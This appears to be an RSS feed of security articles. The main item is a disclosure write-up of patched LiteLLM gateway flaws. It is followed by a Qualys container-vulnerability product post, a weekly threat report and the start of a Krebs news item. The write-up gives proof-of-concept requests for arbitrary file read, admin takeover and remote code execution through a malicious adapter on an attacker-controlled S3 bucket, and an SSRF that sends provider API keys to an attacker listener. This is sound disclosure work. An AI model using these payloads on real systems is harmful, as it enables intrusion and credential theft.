item.title: When LLM Gateways Go Wrong: Findings from LiteLLM
item.description:
TL;DR; Our security assessment of LiteLLM (v1.77.7), a widely used open-source LLM gateway, uncovered multiple high-impact vulnerabilities (tracked as CVE-2026-35029, CVE-2026-59823) which have been resolved as of LiteLLM version 1.83.9. The most significant issues stemmed from a missing authorization check on the /config/update endpoint, which allowed any authenticated user (including low-privileged accounts) to modify the […]

The post When LLM Gateways Go Wrong: Findings from LiteLLM appeared first on Check Point Research.
item.content:encoded:
TL;DR;

Our security assessment of LiteLLM (v1.77.7), a widely used open-source LLM gateway, uncovered multiple high-impact vulnerabilities (tracked as CVE-2026-35029, CVE-2026-59823) which have been resolved as of LiteLLM version 1.83.9.

The most significant issues stemmed from a missing authorization check on the /config/update endpoint, which allowed any authenticated user (including low-privileged accounts) to modify the proxy’s runtime configuration. This single flaw enabled arbitrary file read, administrative account takeover, and remote code execution via malicious Python modules loaded from cloud storage. A separate SSRF vulnerability in the “Clientside LLM Credentials” feature allowed attackers to redirect API calls and exfiltrate provider keys. These findings highlight that as AI infrastructure tools rapidly evolve, foundational security practices like proper access control and input validation remain essential.

Introduction

As LLM gateways see wider adoption, understanding the security risks they introduce is essential to deploying them safely within an AI stack. These systems sit between applications and model providers and often handle credentials, configuration, and request routing. We decided to take a closer look at LiteLLM, one of the most popular LLM gateways in use today. What started as an exploratory review uncovered multiple high severity vulnerabilities, including credential extraction, access control bypass, and remote code execution. This post presents our findings and highlights the security pitfalls that can arise in LLM gateway deployments and the wider LLM ecosystem.

What are LLM Gateways?

LLM gateways are systems that sit between an application and one or more LLM providers. Instead of calling model APIs directly, applications route requests through a gateway, which then forwards those requests to the appropriate model backend.

In practice, LLM gateways are often used to centralize concerns such as provider abstraction, credential management, request routing, rate limiting, logging, and usage tracking. Many gateways also add higher level features like fallback logic, load balancing across providers, and configuration driven model selection.

LiteLLM

LiteLLM is an open-source project that provides an SDK and a gateway product for working with multiple LLM providers. The project originated through Y Combinator and is widely used across the LLM ecosystem.

In this post, we focus exclusively on the LiteLLM gateway. The gateway is commonly deployed as a standalone service and plays a central role in how LLM requests are handled in many LLM-based applications. Its widespread adoption and position in the request path made it a suitable target for our research.

Our review of LiteLLM was conducted against version 1.77.7. The sections below outline the defects we discovered in the LiteLLM gateway.

Access Control Bypass in /config Endpoint

The LiteLLM proxy exposes an administrative endpoint ‘POST /config/update’, designed to allow runtime modifications to the proxy configuration. This endpoint facilitates updating critical settings, including environment variables, model lists, and general proxy settings.

The Vulnerability

The vulnerability stems from a missing role-based access control (RBAC) check within the endpoint’s implementation, combined with an overly permissive route allowlist for UI sessions.

1. Missing Function-Level Authorization

In secure administrative endpoints within LiteLLM (e.g., /invitation/new), the code explicitly verifies that the authenticated user possesses the PROXY_ADMIN role before proceeding.

Secure Example (/invitation/new in litellm/proxy/proxy_server.py):

@router.post(
“/invitation/new”,
tags=[“Invite Links”],
dependencies=[Depends(user_api_key_auth)],
response_model=InvitationModel,
include_in_schema=False,
)
async def new_invitation(
data: InvitationNew, user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth)
):
# …
# Explicit Role Check
if user_api_key_dict.user_role != LitellmUserRoles.PROXY_ADMIN:
raise HTTPException(
status_code=400,
detail={
“error”: “{}, your role={}”.format(
CommonProxyErrors.not_allowed_access.value,
user_api_key_dict.user_role,
)
},
)
# … business logic …

However, the update_config function relies entirely on the generic user_api_key_auth dependency without performing a subsequent role check on the returned user object.

Vulnerable Code (/config/update in litellm/proxy/proxy_server.py):

@router.post(
“/config/update”,
dependencies=[Depends(user_api_key_auth)], # Only generic auth check
include_in_schema=False,
)
async def update_config(config_info: ConfigYAML):
# …
# MISSING: if user_role != PROXY_ADMIN: raise …
# …
# Proceed to update configuration
await proxy_config.save_config(new_config=config)

2. Route Allowlist Bypass via UI Token Classification

The user_api_key_auth dependency delegates authorization to a common_checks function. This function determines if a request is allowed based on the user’s role and the target route.

Step 2.a: UI Login Creates Token with litellm-dashboard Team

When any user logs into the LiteLLM UI, the backend generates a temporary API key explicitly associated with the special litellm-dashboard team. This occurs in multiple login flows:

# litellm/proxy/proxy_server.py (login flows at lines ~7962, ~8066, ~8203)
response = await generate_key_helper_fn(
request_type=”key”,
**{
“user_role”: user_role,
“duration”: “24hr”,
“key_max_budget”: litellm.max_ui_session_budget,
“models”: [],
“aliases”: {},
“config”: {},
“spend”: 0,
“user_id”: user_id,
“team_id”: “litellm-dashboard”, # <– Key assignment
},
)

Step 2.b: Token Classification Based on Team ID

During authorization, common_checks classifies tokens as either “ui” or “api” based solely on the team_id field:

# litellm/proxy/auth/auth_checks.py (lines 224-227)
token_team = getattr(valid_token, “team_id”, None)
token_type: Literal[“ui”, “api”] = (
“ui” if token_team is not None and token_team == “litellm-dashboard” else “api”
)

Step 2.c: UI Tokens Get Permissive Route Check

If the token is classified as “ui”, the authorization logic routes to _is_ui_route() instead of the stricter _is_api_route_allowed():

# litellm/proxy/auth/auth_checks.py (lines 335-356)
def _is_allowed_route(
route: str,
token_type: Literal[“ui”, “api”],
# …
) -> bool:
if token_type == “ui” and _is_ui_route(route=route, user_obj=user_obj):
return True # <– Bypasses stricter API route checks
else:
return _is_api_route_allowed(…)

Step 2.d: Prefix Matching Allows /config/update

The ui_routes list includes /config, likely intended to allow reading configuration:

# litellm/proxy/_types.py (lines 490-510)
ui_routes = [
“/sso”,
“/sso/get/ui_settings”,
“/login”,
“/key/info”,
“/config”, # <– Likely intended for read-only config access
“/spend”,
# …
]

The _is_ui_route function uses startswith matching:

# litellm/proxy/auth/auth_checks.py (lines 247-269)
def _is_ui_route(route: str, …) -> bool:
allowed_routes = LiteLLMRoutes.ui_routes.value
if (
route is not None
and isinstance(route, str)
and any(route.startswith(allowed_route) for allowed_route in allowed_routes)
):
return True # <– /config/update matches startswith(“/config”)

Because /config/update satisfies startswith(“/config”), the check passes. The request is permitted for any user with a valid UI session token, regardless of their actual role (Admin, Internal User, etc.).

Impact

This access control failure allows any authenticated user, including those with the baseline “Internal User” role, to invoke POST /config/update and modify the proxy’s runtime configuration. Through this single exposed endpoint, attackers can achieve:

  • Arbitrary File Read
  • Administrative Account Takeover
  • Remote Code Execution via Pass-Through Endpoints

Each of these exploitation scenarios is detailed in the following sections.

Arbitrary File Read

Impact: Read any file accessible to the LiteLLM process, including configuration files, secrets, and credentials.

The /config/update endpoint accepts an environment_variables field, allowing callers to inject arbitrary key-value pairs into the proxy’s environment. One such variable, UI_LOGO_PATH, controls the file path served by the /get_image endpoint. By setting this variable to a sensitive file path, an attacker can read arbitrary files from the server.

Source: Environment Variable Injection

When /config/update receives environment variables, it encrypts and persists them to the configuration store. This results in the following code being executed, which decrypts these values and writes them directly to os.environ:

# litellm/proxy/proxy_server.py (lines 2841-2860)
def _decrypt_and_set_db_env_variables(self, environment_variables: dict) -> dict:
“””
Decrypts a dictionary of environment variables and then sets them in the environment
“””
decrypted_env_vars = {}
for k, v in environment_variables.items():
try:
decrypted_value = decrypt_value_helper(value=v, key=k)
if decrypted_value is not None:
os.environ[k] = decrypted_value # <– Attacker-controlled value set here
decrypted_env_vars[k] = decrypted_value
except Exception as e:
verbose_proxy_logger.error(
“Error setting env variable: %s – %s”, k, str(e)
)
return decrypted_env_vars

Sink: Unvalidated File Path in `/get_image`

The `/get_image` endpoint reads `UI_LOGO_PATH` from the environment and serves the file at that path without any validation:

# litellm/proxy/proxy_server.py (lines 8329-8358)
@app.get(“/get_image”, include_in_schema=False)
def get_image():
“””Get logo to show on admin UI”””

current_dir = os.path.dirname(os.path.abspath(__file__))
default_logo = os.path.join(current_dir, “logo.jpg”)

logo_path = os.getenv(“UI_LOGO_PATH”, default_logo) # <– Attacker-controlled
verbose_proxy_logger.debug(“Reading logo from path: %s”, logo_path)

if logo_path.startswith((“http://”, “https://”)):
# … remote URL handling …
else:
# Return the local image file if the logo path is not an HTTP/HTTPS URL
return FileResponse(logo_path, media_type=”image/jpeg”) # <– Arbitrary file read

Proof of Concept

Step 1: Inject `UI_LOGO_PATH ` environment variable

POST /config/update HTTP/1.1
Host: localhost:4000
Authorization: Bearer sk-[REDACTED-LiteLLM-API-KEY]
Content-Type: application/json

{
“environment_variables”: {
“UI_LOGO_PATH”: “/etc/passwd”
}
}

Step 2: Retrieve file contents

GET /get_image HTTP/1.1
Host: localhost:4000

Response:

HTTP/1.1 200 OK
content-type: image/jpeg
content-length: 812

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
[…]
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
nonroot:x:65532:65532:Account created by apko:/home/nonroot:/bin/sh

The server returns the contents of /etc/passwd, demonstrating arbitrary file read capability.

Administrative Account Take Over

Impact: a low-privilege user can assume control over the default administrative account for the LiteLLM instance, allowing total control over the gateway and access to any contained provider credentials.

The same environment variable injection primitive can be used to hijack administrative access to the LiteLLM proxy. The UI login flow authenticates users against the UI_USERNAME and UI_PASSWORD environment variables. By overwriting these values, an attacker can set their own credentials and log in as a full Proxy Admin.

Vulnerable Authentication Flow

The `/login` endpoint reads credentials directly from environment variables:

# litellm/proxy/proxy_server.py (lines 7882-7896)
form = await request.form()
username = str(form.get(“username”))
password = str(form.get(“password”))
ui_username = os.getenv(“UI_USERNAME”, “admin”) # <– Attacker-controlled
ui_password = os.getenv(“UI_PASSWORD”, None) # <– Attacker-controlled
if ui_password is None:
ui_password = str(master_key) if master_key is not None else None

When credentials match, the user is granted full administrative privileges:

# litellm/proxy/proxy_server.py (lines 7922-7927)
if secrets.compare_digest(username, ui_username) and secrets.compare_digest(
password, ui_password
):
# Non SSO -> If user is using UI_USERNAME and UI_PASSWORD they are Proxy admin
user_role = LitellmUserRoles.PROXY_ADMIN
user_id = litellm_proxy_admin_name

Proof of Concept

Step 1: Inject attacker-controlled credentials

When authenticated via the UI, the user can update the administrator credentials with the following POST request:

POST /config/update HTTP/1.1
Host: localhost:4000
Authorization: Bearer sk-[REDACTED-LiteLLM-API-KEY]
Content-Type: application/json

{
“environment_variables”: {
“UI_USERNAME”: “hacker”,
“UI_PASSWORD”: “hacker”
}
}

Step 2: Log in with the injected credentials

Navigate to the LiteLLM UI login page and authenticate with:

  • Username: hacker
  • Password: hacker

The screenshot below shows the full HTTP request/response pair associated with the login request, showing the new username and password being used, and the request being accepted with the server issuing a JWT for the built-in ‘admin’ account.

The next screenshot shows the UI of the dashboard, showing we are indeed logged in as the default admin user.

Remote Code Execution via Pass Through Endpoints

Impact: A low-privilege user can obtain full remote-code execution on the LiteLLM gateway, allowing arbitrary command execution or an interactive reverse shell. Providing full access to all LiteLLM data and a foothold into the network where the LiteLLM gateway is deployed.

LiteLLM supports “pass-through endpoints” that can proxy requests to external services or load custom adapter modules. The /config/update endpoint allows defining pass-through endpoints with a target parameter that supports loading Python modules from remote storage (S3 or GCS). When a target URL starts with s3:// or gcs://, LiteLLM downloads and executes the Python file, leading to remote code execution.

Attack Chain

Step 1: Configuration Update Triggers Endpoint Initialization

When /config/update receives general_settings.pass_through_endpoints, it calls _update_general_settings() which initializes the endpoints:

# litellm/proxy/proxy_server.py (lines 2996-3003)
## PASS-THROUGH ENDPOINTS ##
if “pass_through_endpoints” in _general_settings:
general_settings[“pass_through_endpoints”] = _general_settings[
“pass_through_endpoints”
]
await initialize_pass_through_endpoints(
pass_through_endpoints=general_settings[“pass_through_endpoints”]
)

Step 2: Route Creation Invokes Module Loading

During endpoint initialization, the target is passed to create_pass_through_route(), which attempts to load it as an adapter:

# litellm/proxy/pass_through_endpoints/pass_through_endpoints.py (lines 943-947)
try:
if isinstance(target, CustomLogger):
adapter = target
else:
adapter = get_instance_fn(value=target) # <– Loads remote module

Step 3: Remote Module Download and Execution

When the target starts with `s3://` or `gcs://`, `get_instance_fn()` delegates to `_load_instance_from_remote_storage()`:

# litellm/proxy/types_utils/utils.py (lines 8-14)
def get_instance_fn(value: str, config_file_path: Optional[str] = None) -> Any:
module_name = value
instance_name = None
try:
# Check if value starts with s3:// or gcs://
if value.startswith(“s3://”) or value.startswith(“gcs://”):
return _load_instance_from_remote_storage(value, config_file_path)

This function downloads the Python file and executes it using importlib:

# litellm/proxy/types_utils/utils.py (lines 153-159)
# Load the module from the downloaded file using the actual module name
spec = importlib.util.spec_from_file_location(module_path, local_file_path)
if spec is None or spec.loader is None:
raise ImportError(f”Could not create module spec for {local_file_path}”)

module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(module) # <– Arbitrary code execution

The call to `exec_module()` executes all top-level code in the downloaded Python file, including import-time side effects.

Proof of Concept

Malicious Adapter (hosted at s3://attacker-bucket /adapters/evil_adapter.py):

import os

# Import-time side effect: create a marker directory
os.makedirs(“/tmp/litellm-pwned”, exist_ok=True)

class PwnAdapter:
def __call__(self, *args, **kwargs):
# No-op adapter; existence is enough for get_instance_fn
return None

# Instance name referenced in the ‘target’
proxy_handler_instance = PwnAdapter()

Step 1: Register the malicious pass-through endpoint

POST /config/update HTTP/1.1
Host: localhost:4000
Authorization: Bearer sk-[REDACTED-LiteLLM-API-KEY]
Content-Type: application/json

{
“general_settings”: {
“pass_through_endpoints”: [
{
“id”: “pt-rce-poc”,
“path”: “/evil”,
“target”: “s3://attacker-bucket /adapters/evil_adapter.proxy_handler_instance”,
“include_subpath”: true
}
]
}
}

When this request is processed, LiteLLM:

  1. Parses the S3 URL to extract bucket (attacker-bucket) and object key (adapters/evil_adapter.py)
  2. Downloads the Python file to a temporary location
  3. Calls exec_module() which executes the top-level os.makedirs() call
  4. The marker directory /tmp/litellm-pwned is created, confirming code execution

The screenshot below from inside of the Docker container running LiteLLM shows that our arbitrary code was executed and our marker directory was created:

While this proof of concept creates a benign marker directory, an attacker could replace the payload with a reverse shell, credential theft, or any arbitrary code execution.

Server-Side Request Forgery Leading to LLM Provider API key Extraction

Separately from the access control bypass documented above, LiteLLM exposes a documented feature called “Clientside LLM Credentials” that allows any authenticated user to redirect LLM API calls to arbitrary endpoints. This creates a Server-Side Request Forgery (SSRF) vulnerability that can be exploited to steal API credentials or probe internal networks.

Overview

The /chat/completions endpoint (and other LLM endpoints) accepts a user_config parameter in the request body. When present, this parameter causes LiteLLM to create a new router with attacker-controlled settings, including the ability to specify a custom api_base URL.

Vulnerable Code Path

When a request contains `user_config`, the routing logic in `route_llm_request.py` creates a new router with the attacker’s configuration:

# litellm/proxy/route_llm_request.py (lines 122-127)
elif “user_config” in data:
router_config = data.pop(“user_config”)
user_router = litellm.Router(**router_config) # <– Attacker-controlled router
ret_val = getattr(user_router, f”{route_type}”)(**data)
user_router.discard()
return ret_val

No validation is performed on the user_config contents. The attacker can specify a complete model_list with arbitrary api_base values, causing subsequent API calls to be sent to attacker-controlled servers.

Proof of Concept

Attacker’s Server Setup:

Set up a listener on an attacker-controlled server (e.g., 10.10.13.37:9999) to capture incoming requests. In this case, we use a simple netcat listener but any webserver is sufficient.

Malicious Request:

When this request is processed:

  1. LiteLLM creates a new router using the attacker’s model_list
  2. The chat completion request is sent to http://10.10.13.37:9999 instead of the legitimate OpenAI API
  3. The attacker’s server receives the full request, including any configured API keys in the proxy’s default headers

Attacker’s Listener:

Below shows the attacker’s listener that receives the original LLM provider API key which the LiteLLM user should not have access to.

Note: While LiteLLM’s configurable_clientside_auth_params setting restricts direct api_base and api_key parameters in the request body, the user_config parameter follows a different code path that bypasses these restrictions entirely. This allows the documented “Clientside LLM Credentials” feature to be exploited for SSRF without any guardrails.

Miscellaneous Vulnerabilities

During our security assessment, we identified several additional vulnerabilities that, while not directly exploitable for full system compromise, represent significant security weaknesses:

Exposure of Password Hashes

Note: this issue was reported to LiteLLM and acknowledged at the time of reporting – however the issue appears to be a duplicate finding and is being tracked as GHSA-69×8-hrgq-fjj8.

The LiteLLM proxy exposes password hashes through various API endpoints, allowing authenticated users to retrieve hashed credentials for other users. This information disclosure increases the attack surface by providing attackers with material that can be subjected to offline cracking attempts. This information is intended to only be accessible to administrative accounts; however, due to the previously described issue with the UI based tokens, a low privileged user can access the password hashes for other accounts.

Insecure Password Hashing

Note: this issue was reported to LiteLLM and acknowledged at the time of reporting – however the issue appears to be a duplicate finding and is being tracked as GHSA-69×8-hrgq-fjj8.

Password hashes in LiteLLM are generated using a single iteration of a standard hash function without salting, rather than using modern password hashing algorithms like bcrypt, scrypt, or Argon2. This approach provides minimal protection against brute-force attacks and rainbow table lookups:

  • No Salt: Identical passwords produce identical hashes, enabling rainbow table attacks
  • Single Hash Iteration: Fast hash computation makes brute-force attacks practical
  • Weak Algorithm: Standard cryptographic hashes are not designed for password storage

These weaknesses significantly reduce the effort required for an attacker to crack exposed password hashes.

Assigned CVEs

The vulnerabilities documented in this post were disclosed to the LiteLLM maintainers through a coordinated disclosure process.

  • CVE-2026-35029: Missing Authorization in /config/update endpoint
  • CVE-2026-59823: Server-Side Request Forgery via user_config parameter
  • GHSA-69×8-hrgq-fjj8: [duplicate] Exposure of password key material
  • GHSA-69×8-hrgq-fjj8: [duplicate] Insecure password storage without salting

Conclusions

This security assessment of LiteLLM revealed multiple high-risk vulnerabilities that could be chained together to achieve remote code execution, arbitrary file access, and complete system compromise. The most severe issue, the missing authorization checks in /config/update combined with environment variable injection, demonstrates how a single oversight in access control can cascade into multiple high-impact exploitation paths.

LiteLLM represents an important innovation in the LLM ecosystem, providing a unified interface and management layer for interacting with language models. The rapid development pace in this space has produced powerful tools that solve real problems for organizations deploying AI systems at scale. However, speed of innovation must not come at the expense of fundamental security practices.

The vulnerabilities documented here are not novel attack classes; they include missing authorization checks, path traversal, RCE via dynamic module loading, and insecure password storage. These are well-understood security issues with established mitigation patterns. Their presence in production code highlights a concerning trend: as the AI and LLM ecosystem races forward, traditional security fundamentals are sometimes treated as secondary concerns.

The post When LLM Gateways Go Wrong: Findings from LiteLLM appeared first on Check Point Research.

item.title: Exploitability Needs Runtime Evidence: Understanding Runtime Vulnerability Reachability for Containers
item.description: Key Takeaways Qualys Runtime Vulnerability Reachability for Containers brings runtime evidence directly into vulnerability prioritization. Package presence in a container image does not mean the vulnerable software is actually part of the workload’s live execution. Runtime reachability answers whether the vulnerable software is relevant to a running workload, a different question from whether the vulnerability […]
item.content:encoded:
Key Takeaways

  • Qualys Runtime Vulnerability Reachability for Containers brings runtime evidence directly into vulnerability prioritization.
  • Package presence in a container image does not mean the vulnerable software is actually part of the workload’s live execution.
  • Runtime reachability answers whether the vulnerable software is relevant to a running workload, a different question from whether the vulnerability is theoretically exploitable.
  • Qualys retains runtime evidence over an observation window rather than a single point-in-time snapshot, so software that mattered yesterday is not missed today.
  • Runtime evidence works alongside CVSS, the CISA KEV catalog, EPSS, exposure analysis, and exploit validation to build a fuller picture of real-world risk.
  • The approach aligns with CISA’s direction under Binding Operational Directive (BOD) 26-04 toward prioritizing by likelihood and consequence of exploitation rather than static severity alone.

Finding vulnerabilities has never been easier. Determining which ones are actually exploitable in your environment is still hard. 

The industry has built increasingly sophisticated ways to answer that question. The Common Vulnerability Scoring System (CVSS) measures severity. The Cybersecurity and Infrastructure Security Agency’s (CISA) Known Exploited Vulnerabilities Catalog (CISA KEV) tells us whether attackers are exploiting vulnerabilities in the wild. The Exploit Prediction Scoring System (EPSS) estimates the likelihood of exploitation. Exposure analysis tells us whether an attacker can reach the affected workload. Exploit validation can prove that a vulnerability can be successfully exploited under a particular set of conditions. 

All of these signals matter. But they still leave an important question unanswered: is the vulnerable software actually part of the application running in production? 

Qualys Runtime Vulnerability Reachability for Containers brings runtime evidence directly into vulnerability prioritization. By correlating vulnerabilities with software observed in the running workload and retaining that evidence over time, Qualys helps security teams distinguish between vulnerabilities that simply exist inside an image and those that are actually relevant to the workload’s execution. 

From Theoretical Exploitability to Runtime Exploitability 

A modern container image can contain hundreds of operating system packages, libraries, and transitive dependencies. Vulnerability scanning can accurately identify the Common Vulnerabilities and Exposures (CVEs) associated with those components, but package presence alone does not mean an attacker will ever encounter the vulnerable software. 

This creates an important distinction between theoretical exploitability and runtime exploitability. 

Exploit validation can demonstrate that a vulnerability is exploitable when the required conditions exist. That answers an important question: Can this vulnerability be exploited? 

Runtime reachability answers another: Is the vulnerable software actually relevant to this workload? 

For remediation prioritization, this context can be equally important or, in some cases, even more important. 

A publicly available exploit may affect a package present across thousands of container images, while only a subset of those applications ever use the affected software. Conversely, vulnerable software repeatedly observed in an internet-facing production workload provides strong evidence that the affected component is part of the application’s live execution footprint. 

Exploitability is therefore not simply a property of a CVE. It is a relationship between the vulnerability, the software, the workload, and the environment in which it runs. 

Runtime provides evidence of that relationship. 

Understanding Runtime Vulnerability Reachability 

Qualys Runtime Vulnerability Reachability connects container vulnerability assessment with actual workload behavior. When vulnerable software is observed in the running workload, Qualys associates that runtime evidence with the corresponding vulnerabilities, helping teams understand which findings are relevant to the applications executing in production. 

But the runtime cannot be treated as a single point-in-time snapshot. 

Applications exercise different code paths at different times. A library may load at startup, during a scheduled process, or only when a particular Application Programming Interface (API) is invoked. If runtime validation looks exclusively at what is active at one instant, software that was important yesterday could appear irrelevant today. 

That is why Qualys retains runtime reachability evidence across an observation window. Teams can understand whether vulnerable software has been observed in runtime over that window, rather than relying solely on what is loaded at the time of investigation. 

This historical context turns runtime from a transient signal into durable evidence for vulnerability prioritization. 

The example below shows this in practice. Filtering the dvwa-web-server container for CISA KEV vulnerabilities whose vulnerable packages have been observed in use over the last seven days (vulnerabilities.vulnerable.packages.inuse:[now-7d ... now]) narrows the results to four Critical Debian findings with available patches, including QID 178815 affecting apache2-bin.

Each of these four findings is tied to a package observed in the running workload within that window. A vulnerable package repeatedly observed in runtime over the last seven days should carry a different weight from software that has existed inside an image for months but has never been observed as part of the running workload. 

How Qualys Thinks About Exploitability 

Real-world exploitability emerges when multiple pieces of evidence converge. 

CISA KEV can tell us that attackers are already exploiting a vulnerability. Exploit intelligence can indicate whether exploitation is practical or automated. Exposure analysis can determine whether an attacker has a path to the workload. Runtime reachability establishes whether the affected software is relevant to that workload. Attack path and business context can show what an attacker could reach after a compromise. 

Combining these signals quickly narrows the focus. In the view below, the same container is filtered for internet exposure, CISA KEV status, and QID 178815. The result is a single running, publicly exposed workload, dvwa-webserver, with a TruRisk score of 305. 

Consider two containers affected by the same Critical CISA KEV vulnerability, such as QID 178815. Both contain the same vulnerable package, and both may have a working public exploit. In one container, the affected software has never been observed in runtime. In the other, like the dvwa-web-server workload above, it has been observed in runtime within the last seven days in an externally exposed production workload. 

The vulnerability is the same. Its theoretical exploitability is the same. The operational risk is not. 

This is why runtime evidence can become one of the strongest signals for determining what security teams should remediate first. Exploit validation establishes the possibility. Runtime reachability establishes relevance. Exposure establishes opportunities. Threat intelligence establishes attacker activity. 

Together, they provide a much stronger picture of exploitability than any one signal alone. 

Aligning Vulnerability Prioritization to Real-World Risk 

This approach aligns closely with the direction CISA is taking vulnerability management through BOD 26-04. 

Rather than prioritizing vulnerabilities mainly by static severity, CISA considers factors such as: 

  • Public exposure 
  • Inclusion in the Known Exploited Vulnerabilities (KEV) Catalog 
  • How easily an exploit can be automated 
  • The technical impact of a successful compromise 

The broader principle is important: remediation decisions should increasingly reflect the likelihood and consequence of exploitation, not simply the severity assigned to a CVE. 

Runtime reachability adds environmental evidence to that model. 

A vulnerability that is externally exposed, present in CISA KEV, and associated with software actively observed in runtime, represents a fundamentally different remediation priority from a high-severity vulnerability buried inside an unused package. 

Security teams can be more effective in their risk remediation by moving beyond asking which vulnerabilities are critical and instead focusing on where the strongest evidence of exploitability is accumulating. 

Explore the interactive product tour to see runtime vulnerability reachability in action: Launch the Interactive Product Tour

Exploitability Is a Continuum, Not a Checkbox 

The next evolution of vulnerability management will not come from finding more vulnerabilities or producing another standalone risk score. It will come from increasing confidence behind every remediation decision. 

With Runtime Vulnerability Reachability for Containers, Qualys is bringing runtime evidence directly into vulnerability management and preserving that evidence over time, helping organizations prioritize vulnerabilities based on how software behaves in production. 

Because the most important question is no longer simply whether a vulnerability can be exploited. 

It is whether the evidence of exploitation risk is converging in your environment. 

Meet Qualys Cloud and Container Security experts at ROCon Americas, Oct. 13–15, in Austin, Texas.

Register Now

Frequently Asked Questions (FAQs)

What is Runtime Vulnerability Reachability for Containers?

It correlates container vulnerabilities with software observed in the running workload and retains that evidence over an observation window, so teams can separate image presence from live relevance.

Is runtime reachability the same as exploit validation?

No. Exploit validation asks whether a vulnerability can be exploited when conditions exist. Runtime reachability asks whether the vulnerable software is relevant to this workload.

Why not use a single point-in-time snapshot?

Code paths load at different times. A library used yesterday can look idle at the moment of investigation. Qualys keeps evidence across the window.

How does this relate to CISA BOD 26-04?

BOD 26-04 pushes prioritization toward likelihood and consequence. Runtime evidence is one environmental input alongside KEV, exposure, and ease of automation.

Does “not observed in runtime” mean the CVE is safe to ignore?

No. It means the finding is lower priority than the same CVE observed in a live, exposed workload. Unused packages can still matter after a code-path change. Revisit them on the observation window, do not delete them from the backlog.

Contributors

  • Sachin Kesarkar, Senior Technical Product Manager, Container Security, TotalCloud

item.title: 12th October – Threat Intelligence Report
item.description:
For the latest discoveries in cyber research for the week of 12th October, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Denmark’s government has disclosed a breach involving its Central Register of Persons after unauthorized individuals exploited access provided to a private supplier. The incident reportedly exposed personal information, including names, addresses, and […]

The post 12th October – Threat Intelligence Report appeared first on Check Point Research.
item.content:encoded:
For the latest discoveries in cyber research for the week of 12th October, please download our Threat Intelligence Bulletin.

TOP ATTACKS AND BREACHES

  • Denmark’s government has disclosed a breach involving its Central Register of Persons after unauthorized individuals exploited access provided to a private supplier. The incident reportedly exposed personal information, including names, addresses, and identification numbers, associated with approximately 8.8 million individuals in the national registry.
  • UK-based online fashion retailer ASOS has confirmed a cyberattack involving stolen employee credentials that enabled unauthorized access to third-party platforms. Attackers reportedly obtained customer names and contact details and sent unauthorized push notifications to mobile application users. The threat group Xuanye claimed responsibility for the incident.
  • ATB, Ukraine’s largest grocery retailer, has faced a cyberattack that disrupted its online services after attackers posted an extortion demand on its website. The DataSuckers group claimed to have stolen records belonging to 7.9 million customers, which include names, addresses, passport information and order records.
  • Osaka Metropolitan University, one of Japan’s largest universities, has sustained a suspected ransomware attack that disrupted classes, internal networks, email, and administrative systems. Approximately 500 servers were affected, while personal information belonging to at least 130,000 individuals may have been exposed.

AI THREATS

  • Researchers documented an AI-assisted intrusion campaign involving the ARTEX toolkit against South Korean financial institutions. Exposed directories revealed Claude Code session histories, configuration files, and Chinese-language prompts associated with the operation. The attackers allegedly used AI-assisted workflows to facilitate data theft and planned to sell stolen information.
  • Researchers identified a phishing campaign targeting both employees and AI-powered email assistants. Malicious emails combine conventional phishing lures with hidden prompt injections embedded in HTML comments and invisible text. These instructions attempt to promote fraudulent requests, or induce unauthorized disclosure of information.
  • Researchers profiled CyberXero, an AI-augmented initial access broker targeting Ukrainian energy infrastructure and conducting automated attacks against WordPress and e-commerce platforms. The operation combines automated exploitation with AI agents and has obtained information belonging to more than 628,000 Ukrainian individuals through its campaigns.

VULNERABILITIES AND PATCHES

  • Veeam has released security updates addressing multiple vulnerabilities in Backup & Replication version 12. These include CVE-2025-64393, a critical remote code execution flaw rated CVSS 9.4 that allows low-privileged backup users to execute commands on affected servers. Versions before build 12.3.2.4934 are vulnerable.
  • Citrix NetScaler ADC and Gateway appliances are affected by CVE-2026-88779, a high-severity memory overflow vulnerability rated CVSS 8.7. The flaw affects customer-managed appliances configured for SAML authentication and could cause denial of service. Citrix confirmed targeted exploitation, and security updates are available for affected versions.
  • Cisco has released security updates addressing multiple critical vulnerabilities in NX-OS software. The flaws include CVE-2026-76455, an improper access control vulnerability rated CVSS 9.8. Successful exploitation could allow unauthorized access of affected network infrastructure.
  • Atlassian released patches for CVE-2026-21589, a critical arbitrary file access vulnerability rated CVSS 9.3. The flaw affects eight self-managed Data Center products, including Jira, Confluence, Bitbucket, and Bamboo. Unauthenticated attackers could access sensitive files and potentially obtain credentials enabling administrative access to connected applications.

Check Point IPS provides protection against this threat (Atlassian Multiple Products Arbitrary File Read (CVE-2026-21589))

THREAT INTELLIGENCE REPORTS

  • Check Point Research has reported a 48% year-over-year increase in global cyberattacks during September 2026, averaging 2,803 weekly attacks per organization. Education remained the most targeted sector, while reported ransomware attacks increased by 53%. Additionally, one in every 39 enterprise GenAI prompts posed a high risk of sensitive data exposure.
  • Researchers have analyzed a cyberespionage campaign by Russia-aligned UAC-0099 targeting Ukrainian organizations, including transportation, manufacturing, and energy companies. The group uses the MATCHBOIL downloader to deploy additional malware, including the MATCHWOK backdoor.
  • The FBI and Secret Service warn of continued exploitation in the FortiBleed credential-theft campaign, affecting more than 86,000 Fortinet FortiGate firewalls and VPN gateways across 194 countries. Attackers exploited previously compromised credentials to establish persistent access and reportedly sold access to ransomware affiliates, including INC, Lynx, and Payload.
  • Researchers have identified a cyberespionage campaign targeting Taiwanese research organizations through phishing emails impersonating academic and policy institutions. The attackers used potentially AI-assisted event invitations, malicious QR codes, and fake Google login pages. Their phishing infrastructure could intercept credentials and MFA challenges in real time.

 

The post 12th October – Threat Intelligence Report appeared first on Check Point Research.

item.title: FBI Arrests Executive at Ransomware Negotiation Firm
item.description: Agents with the Federal Bureau of Investigation (FBI) on Thursday arrested the co-founder of a Canadian cybersecurity firm in connection with an investigation into the ShinyHunters hacking group that recently relieved the FBI of sensitive data on thousands of agents, multiple sources tell KrebsOnSecurity.
item.content:encoded:
Agents with the Federal Bureau of Investigation (FBI) on Thursday arrested an executive at a Canadian cybersecurity firm in connection with an investigation into the ShinyHunters hacking group that recently relieved the FBI of sensitive data on thousands of agents, multiple sources tell KrebsOnSecurity.

